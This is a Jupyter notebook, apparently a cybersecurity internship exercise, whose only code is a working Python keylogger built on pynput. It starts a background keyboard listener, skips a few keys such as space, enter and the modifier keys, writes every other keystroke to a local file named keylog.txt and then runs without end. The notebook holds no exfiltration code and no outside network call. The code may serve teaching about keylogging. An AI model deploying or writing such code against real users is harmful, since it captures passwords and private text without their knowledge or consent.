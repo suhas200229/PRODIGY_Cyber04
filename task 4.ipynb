{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "84340b00",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard\n",
    "import time\n",
    "\n",
    "# Function to start logging keystrokes\n",
    "def on_press(key):\n",
    "    global log_file\n",
    "    key_string = str(key)\n",
    "\n",
    "    # Exclude some keys from logging\n",
    "    if key == keyboard.Key.space or key == keyboard.Key.enter or key == keyboard.Key.shift or key == keyboard.Key.shift_r or key == keyboard.Key.shift_l or key == keyboard.Key.caps_lock or key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_r or key == keyboard.Key.ctrl_l or key == keyboard.Key.alt or key == keyboard.Key.alt_r or key == keyboard.Key.alt_l or key == keyboard.Key.backspace or key == keyboard.Key.tab or key == keyboard.Key.delete:\n",
    "        return\n",
    "\n",
    "    # Log the keys pressed\n",
    "    log_file.write(key_string + \" \")\n",
    "    log_file.flush()\n",
    "\n",
    "# Initialize the log\n",
    "log_file_name = \"keylog.txt\"\n",
    "log_file = open(log_file_name, \"w+\")\n",
    "\n",
    "# Start logging keystrokes\n",
    "listener = keyboard.Listener(on_press=on_press)\n",
    "listener.start()\n",
    "\n",
    "# Keep the script running\n",
    "while True:\n",
    "    time.sleep(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f4a0cf92",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
